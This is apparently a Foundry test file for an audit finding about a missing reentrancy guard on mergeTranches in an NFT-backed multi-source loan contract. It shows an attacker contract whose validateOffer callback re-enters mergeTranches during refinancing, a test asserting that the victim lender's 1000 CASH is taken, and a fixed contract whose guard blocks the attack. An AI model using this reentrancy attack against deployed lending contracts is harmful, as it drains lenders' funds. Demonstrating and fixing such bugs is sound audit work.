// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {
    Cash,
    Exploit,
    Loan,
    MultiSourceLoan,
    Nft,
    VictimLender
} from "./35216-h-14-mergetranchesrefinancepartial-lack-of-nonreentrant-code.sol";

/// Warden's fix: mergeTranches takes the same guard refinance already holds.
contract MultiSourceLoanFixed is MultiSourceLoan {
    constructor(Cash _cash, Nft _nft) MultiSourceLoan(_cash, _nft) {}

    function mergeTranches(uint256 _loanId, Loan memory _loan, uint256 _minTranche, uint256 _maxTranche)
        external
        override
        returns (uint256, Loan memory)
    {
        if (lock() != 0) revert Reentered();
        return _mergeTranchesEntry(_loanId, _loan, _minTranche, _maxTranche);
    }
}

/// Same callback as the exploit, aimed at the fixed loan.
contract FixedAttacker {
    MultiSourceLoanFixed public loan;
    uint256 public constant NFT_ID = 1;

    constructor(MultiSourceLoanFixed _loan) {
        loan = _loan;
    }

    function validateOffer(uint256 loanId, Loan memory openLoan) external {
        loan.mergeTranches(loanId, openLoan, 0, 0);
    }

    function attack(uint256 id1, Loan memory loan1) external {
        loan.refinanceFromLoanExecutionData(id1, loan1, address(this));
    }
}

contract Finding35216Test is Test {
    function test_exploit_reentrant_merge_takes_victim_principal() public {
        Exploit e = new Exploit();
        e.run();
        assertEq(e.cash().balanceOf(address(e)), e.PRINCIPAL(), "attacker received the 1000 CASH");
        assertEq(e.cash().balanceOf(address(e.victim())), 0, "victim lost the 1000 CASH");
        assertEq(e.nft().ownerOf(e.NFT_ID()), address(e), "attacker holds the NFT again");
        assertTrue(e.loan().loans(e.victimLoanId()) != bytes32(0), "victim loan still recorded");
        assertTrue(e.refiId() != e.mergedId(), "two loan ids");
    }

    function test_control_nonreentrant_merge_blocks_the_callback() public {
        Cash cash = new Cash();
        Nft nft = new Nft();
        MultiSourceLoanFixed fixedLoan = new MultiSourceLoanFixed(cash, nft);
        VictimLender victim = new VictimLender();
        FixedAttacker attacker = new FixedAttacker(fixedLoan);

        cash.mint(address(victim), 1000 ether);
        victim.approveCash(cash, address(fixedLoan));
        nft.mint(address(attacker), 1);
        vm.prank(address(attacker));
        nft.setApprovalForAll(address(fixedLoan), true);

        Loan memory loan1 = Loan({borrower: address(attacker), lender: address(attacker), tokenId: 1, principal: 0});
        vm.prank(address(attacker));
        uint256 id1 = fixedLoan.seed(loan1);

        vm.prank(address(attacker));
        vm.expectRevert(MultiSourceLoan.Reentered.selector);
        attacker.attack(id1, loan1);

        assertEq(cash.balanceOf(address(victim)), 1000 ether, "victim kept the cash");
        assertEq(cash.balanceOf(address(attacker)), 0, "attacker received nothing");
        assertEq(nft.ownerOf(1), address(fixedLoan), "nft stayed in the original escrow");
        assertTrue(fixedLoan.loans(id1) != bytes32(0), "original loan still the only one");
        assertEq(fixedLoan.nextId(), 2, "refinance id reservation rolled back");
    }
}
